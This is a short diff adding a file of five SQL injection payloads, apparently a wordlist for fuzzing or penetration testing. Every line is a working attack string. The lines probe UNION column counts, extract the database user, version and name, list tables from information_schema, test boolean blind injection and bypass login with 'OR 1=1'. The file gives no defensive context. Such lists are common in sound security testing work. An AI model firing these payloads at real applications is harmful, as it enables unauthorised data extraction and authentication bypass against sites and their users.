@@ -1,0 +1,5 @@
+1' UNION SELECT 1,2,3,4,5,6,7,8--
+1' UNION SELECT null,user(),version(),database(),null,null,null,null--
+1' UNION SELECT 1,table_name,null,null,null,null,null,null FROM information_schema.tables--
+1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
+1' OR 1=1#
